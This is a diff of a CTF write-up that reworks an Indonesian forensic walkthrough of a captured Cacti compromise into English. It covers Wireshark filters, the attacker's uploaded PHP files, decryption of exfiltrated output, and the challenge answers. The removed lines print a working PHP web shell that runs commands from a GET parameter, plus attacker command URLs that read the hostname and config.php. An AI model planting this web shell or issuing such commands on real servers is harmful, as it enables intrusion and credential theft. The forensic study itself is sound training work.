@@ -7,10 +7,7 @@ description: "Writeup for University CTF 2025 by K4lameety."
 ---
 
 ![Banner](https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/MqUyTLSOoOQppE1kWrgVBhQVTymEs9N0jhlTPc5q.jpg)
-
-## About the Event
-
-### 🎄 Grand Legend — The Tinsel Trouble of Tinselwick
+# 🎄 Grand Legend — The Tinsel Trouble of Tinselwick
 
 In the snow-glittered village of Tinselwick, where peppermint chimneys puff cinnamon steam and toy trains zip between rooftops, the Festival of Everlight is the most magical night of the year. It's when the Great Snowglobe atop Sprucetop Tower shines brightest, sending cheer across the land and granting every child one heartfelt wish.
 
@@ -23,182 +20,137 @@ With the countdown to Everlight Eve ticking fast, eight unlikely helpers—toy-f
 This isn't a battle to save the world—it's a dash to save the spirit of the season.
 
 The Great Snowglobe must sparkle again. And in Tinselwick, even the tiniest heart can outshine the longest night.
-## Introduce
 
-Halo, Dalam writeup pertama ini, saya akan membahas solusi dari 3 tantangan yang berhasil saya selesaikan sebagai kontribusi untuk Tim saya di University CTF 2025. Mulai dari kategori **Forensic**, **Web**, dan **Pwn**.
+## Introduction
 
-## Challenge
-### Forensic
+Hello, In this writeup, I will discuss solutions for 3 challenges that I successfully solved as a contribution to my team in this event. Starting from the **Forensic**, **Web**, and **Reversing** categories. I will explain them in a very simple way so they are easy to understand.
 
+## Challenges
 
-#### A Trail of Snow & Deception
+### Forensic: A Trail of Snow & Deception
 
-Difficult: Easy
+- **Difficulty:** Easy  
+- **Points:** 1000
 
-Points: 1000
+### Description & Scenario
 
-##### Deskripsi & Skenario
+> Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. "Someone’s been tampering with the magic," Oliver murmured. "But why?" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?
 
-> Oliver Mirth, ahli forensik Tinselwick, berjongkok di dekat tiang lentera yang bersinar, menelusuri jejak debu berkilau dengan jari bersarung tangannya.
-> Jejak itu mengarah ke tumpukan salju, lalu menghilang, tanpa jejak kaki,
-> tanpa tanda-tanda perlawanan. Dia melirik ke atas ke arah Bola Salju yang berkedip-kedip di puncak Menara Sprucetop, cahayanya bergetar seperti bintang yang memudar.
-> 'Seseorang telah mengutak-atik sihirnya,' gumam Oliver.
-> 'Tapi kenapa?' Dia berdiri tegak, matanya menyipit. Jejaknya mungkin hilang,
-> tetapi misterinya baru saja dimulai.
-> Bisakah Oliver mengungkap rahasia di balik cahaya yang memudar?
+### Challenge Questions
 
-Dalam challenge **University CTF 2025: Tinsel Trouble** kategori Forensic ini, kita diberikan file PCAP (capture.pcap) dan 7 pertanyaan. Tugas kita adalah membantu Oliver menganalisis jejak digital untuk menemukan siapa dan bagaimana sistem "Snowglobe" disusupi.
-
-
-##### Daftar Pertanyaan
-
-> 1. What is the Cacti version in use? (e.g. 7.1.0)
-> 2. What is the set of credentials used to log in to the instance? (e.g., username:password)
-> 3. Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)
-> 4. What file gets downloaded using curl during exploitation process? (e.g. filename)
-> 5. What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
-> 6. What is the system machine hostname? (e.g. server01)
-> 7. What is the database password used by Cacti? (e.g. Password123)
+1. What is the Cacti version in use? (e.g. 7.1.0)
+2. What is the set of credentials used to log in to the instance? (e.g., username:password)
+3. Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)
+4. What file gets downloaded using curl during exploitation process? (e.g. filename)
+5. What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
+6. What is the system machine hostname? (e.g. server01)
+7. What is the database password used by Cacti? (e.g. Password123)
 
 
-##### 1. Versi Cacti yang Digunakan
+### 1. Cacti Version
 
-Karena Kita sudah diberi tahu nama aplikasi yang berjalan (Cacti), Saya memulai dengan mencari Packet Detail yang berisi string **Cacti**. Saya langsung menemukan packet 357 yang terindikasi berisi string **Cacti**.
+**Approach:** Search for "Cacti" string in packet details, then follow the HTTP stream.
+
+**Steps:**
+1. Filter packets containing "Cacti" → Found **Packet 357**
+2. Follow HTTP Stream → Shows the version in response
 
 ![Packet 357](https://i.ibb.co.com/p6yHhk34/Screenshot-2025-12-22-170000.png)
-
-Setelah itu Saya mencari versi **Cacti** dengan mengikuti HTTP Stream **Packet 357** tersebut.
-
 ![Version cacti](https://i.ibb.co.com/BHYwr7Vc/Screenshot-2025-12-22-170829.png)
 
-**Jawaban 1:** **1.2.28**
+**Answer 1:** `1.2.28`
 
 
-##### 2. Kredensial Login
+### 2. Login Credentials
 
-Penyusup melakukan login ke dashboard (index.php). Dengan memfilter request POST ke `index.php`, Saya langsung menemukan 1 Packet berisi username dan password dengan mudah saat menganalisis Packet tersebut.
+**Approach:** Find the login request (POST to index.php) to get username and password.
 
-```
-http.request.method == POST && http.request.uri contains "index.php"
-```
+**Steps:**
+1. Use Wireshark filter: `http.request.method == POST && http.request.uri contains "index.php"`
+2. Analyze packet → Extract credentials from POST data
 
-**Jawaban 2:** **marnie.thistlewhip:Z4ZP_8QzKA**
+**Answer 2:** `marnie.thistlewhip:Z4ZP_8QzKA`
 
 
-##### 3. Analisis Web Shell & Payload
+### 3. Web Shell & Payload Analysis
 
-> Berisi Jawaban 3-5
+**Approach:** Find all PHP files uploaded by attacker, in order of appearance.
 
-Setelah mendapatkan akses, penyusup tersebut mengunggah beberapa file PHP berbahaya (backdoor/webshell). Saya mencari file-file tersebut dengan memfilter request GET yang mengandung `.php`.
-
-```
-http.request.method == GET and http.request.uri contains ".php"
-```
+**Steps:**
+1. Filter: `http.request.method == GET and http.request.uri contains ".php"`
+2. Note the order files appear in network stream
+3. These are the malicious PHP backdoors
 
 ![Version cacti](https://i.ibb.co.com/8LkrKNjL/Screenshot-2025-12-22-180639.png)
 
-Berdasarkan urutan waktu dalam stream jaringan, file-file tersebut adalah:
+**Answer 3:** `JWuA5a1yj.php,ornf85gfQ.php,f54Avbg4.php`
 
-**Jawaban 3:** **JWuA5a1yj.php,ornf85gfQ.php,f54Avbg4.php**
+---
 
-##### Eksekusi Perintah & Download File
+### 4. Downloaded File
 
-Kemudian Penyusup menggunakan perintah `curl` untuk mengunduh binary eksternal ke server target. Disini Saya mencari manual Packet Detail yang berisi string **curl**.
-Tapi untuk menghemat waktu, Saya sarankan menggunakan Wireshark Filter berikut:
+**Approach:** Find what file was downloaded using curl.
 
-```
-http.request.method == GET and http.user_agent contains "curl"
-```
+**Filter:** `http.request.method == GET and http.user_agent contains "curl"`
 
-Dan akan langsung muncul beberapa nama file yang setelah saya coba satu-satu ternyata yang benar yaitu **bash**.
+**Answer 4:** `bash`
 
-**Jawaban 4:** **bash**
+---
 
-##### Analisis Variabel PHP
+### 5. PHP Variable Name
 
-Dalam file **bash** yang baru saja kita analisis tersebut terdapat variabel yang digunakan untuk menyimpan output dari fungsi eksekusi sistem (seperti `shell_exec`) namun di enkripsi dengan Base64.
+**Approach:** Decode the PHP file and find the variable storing command output.
 
-![Version cacti](https://i.ibb.co.com/jkG1cwtX/Screenshot-2025-12-22-183647.png)
+**Steps:**
+1. Decode Base64 PHP code from the web shell
+2. Find `shell_exec()` function call
+3. Identify variable that stores the output
 
-**Sebelum dekripsi:**
-```
-PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=
-```
-
-**Setelah dekripsi:**
+**Key Code Line:**
 ```php
-<?php 
-$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";
-$A4gVaRmV = "pZ7qR1tLw8Df3XbK";
-$A4gVaXzY = base64_decode($_GET["q"]);
-$a54vag = shell_exec($A4gVaXzY);
-$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
-echo base64_encode($A4gVaQdF); 
-?>
+$a54vag = shell_exec($A4gVaXzY);  // ← This stores command output
 ```
 
-Dari hasil dekripsi di atas, kita dapat melihat bahwa nama variabel yang menyimpan hasil eksekusi perintah sistem adalah **$a54vag**. Dan juga ada indikasi penggunaan enkripsi AES-256-CBC untuk mengamankan output tersebut.
+**Answer:** `$a54vag`
 
-##### 4. Dekripsi Data Konfigurasi
+---
 
-Setelah mendapatkan akses ke web shell, penyusup mencoba untuk mengekstrak informasi sensitif dari server, seperti hostname sistem dan password database. Namun, informasi ini ditemukan dalam keadaan terenkripsi. Saya menggunakan informasi dari web shell sebelumnya untuk mendekripsi data ini.
+### 6. System Hostname
 
-Di saat mencari jawaban ke 3 tadi, ternyata payload di q= pada file terakhir (f54Avbg4.php) adalah sebuah perintah untuk mendapatkan hostname dan password database yang terenkripsi.
+**Approach:** Find encrypted hostname output, then decrypt using AES-256-CBC.
 
-**Sebelum dekripsi:**
-- /cacti/f54Avbg4.php?q=aWQ=
-- /cacti/f54Avbg4.php?q=aG9zdG5hbWU=
-- /cacti/f54Avbg4.php?q=cHdk
-- /cacti/f54Avbg4.php?q=bHMgLWxh
-- /cacti/f54Avbg4.php?q=bHMgLWxhIGluY2x1ZGU=
-- /cacti/f54Avbg4.php?q=Y2F0IGluY2x1ZGUyZ29uZmlnLnBocA==
+**Steps:**
+1. Search for packet with `hostname` command execution
+2. Find encrypted response in packet details
+3. Use CyberChef with:
+   - **Algorithm:** AES Decrypt
+   - **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
+   - **IV:** `pZ7qR1tLw8Df3XbK`
+   - **Input format:** Base64
+   - **Output format:** UTF8
 
-**Setelah dekripsi:**
-- /cacti/f54Avbg4.php?q=id
-- /cacti/f54Avbg4.php?q=hostname
-- /cacti/f54Avbg4.php?q=pwd
-- /cacti/f54Avbg4.php?q=ls -la
-- /cacti/f54Avbg4.php?q=ls -la include
-- /cacti/f54Avbg4.php?q=cat include/config.php
+**Answer:** `tinselmon01`
 
-Hasil diatas memudahkan Saya untuk menemukan Packet Detail yang berisi output terenkripsi dari perintah `hostname` dan isi file `include/config.php` yang berisi password database.
+---
 
-##### A. Temukan Hostname
+### 7. Database Password
 
-Analisis Packet Detail dari perintah `hostname` menunjukkan bahwa hostname sistem disimpan dalam bentuk terenkripsi. Saya menggunakan kunci dan IV yang sama dari web shell untuk mendekripsi hostname tersebut dengan CyberChef.
+**Approach:** Find encrypted database config file output, then decrypt it.
 
-**CyberChef Recipe (Hostname):**
-```
-KEY: kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G
-IV: pZ7qR1tLw8Df3XbK
-Input (Base64): HYjF7a38Od/H2Qc+uaBKuA==
+**Steps:**
+1. Search for packet with `cat include/config.php` command
+2. Extract encrypted response
+3. Decrypt using same AES-256-CBC key and IV as Question 6
+4. Parse the config file to find `password` field
 
-Result: tinselmon01
-```
+**Decryption Details:**
+- **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
+- **IV:** `pZ7qR1tLw8Df3XbK`
+- **Algorithm:** AES-256-CBC
 
-**Jawaban 6:** **tinselmon01**
+**Answer:** `zqvyh2fLgyhZp9KV`
 
-##### B. Database Password
-
-Selanjutnya, Saya menganalisis output terenkripsi dari file konfigurasi database yang ditemukan di `include/config.php`. Saya menggunakan metode dekripsi yang sama untuk mendapatkan password database.
-
-**CyberChef Recipe (Konfigurasi DB):**
-```
-KEY: kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G
-IV: pZ7qR1tLw8Df3XbK
-Input (Base64): HYjF7a38Od/H2Qc+uaBKuA==
-
-Result: (Berupa teks)
-```
-
-Setelah itu output akan berupa teks konfigurasi database yang telah didekripsi dan berisi password.
-
-**Jawaban 7:** **zqvyh2fLgyhZp9KV**
-
-### Web
-#### Silent Snow
-
-> Difficult: Very Easy
-> Point: 
+### Web: Silent Snow
+### Reversing: CloudyCore
 
 ## Summary
